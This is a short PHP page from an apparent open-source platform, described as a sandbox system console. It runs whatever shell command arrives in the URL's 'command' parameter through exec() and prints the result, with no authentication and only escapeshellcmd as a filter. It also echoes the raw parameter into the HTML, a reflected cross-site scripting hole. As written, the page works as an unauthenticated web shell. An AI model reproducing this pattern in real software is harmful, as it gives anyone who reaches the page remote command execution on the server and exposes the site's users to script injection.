<?php
/**
 * Loads the sandbox system applications console index page
 * @version     $Id: page.php 40 2011-02-09 14:10:00Z biyi $
 * @package     Platform
 * @subpackage  System
 * @category    Application
 * @author      Biyi Akinpelu
 * @link        mailto:biyi@entilda.com
 * @copyright   Copyright (C) 2011 - 2012 The Platform Authors. All rights reserved.
 * @license     GNU Public Licence, see LICENSE.php
 * Platform is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

function console_output($output){
  if (is_array($output) && count($output)){
?>
    <div>
    <?php
    echo '<br>';
    foreach($output as $line) {
      echo $line . '<br>';
    }?>
    </div>
<?php
  }
}
?>
<body class="darktheme" style="font-family: Courier; font-size: 13px; background: #111; color: #bbb">
<?php echo (basename(getcwd())) ?>$ <?php echo ($_GET['command']) ?>

<?php
$command = $_GET['command'];
$data = @exec(escapeshellcmd($command), $output, $return);
console_output($output);
?>
</body>
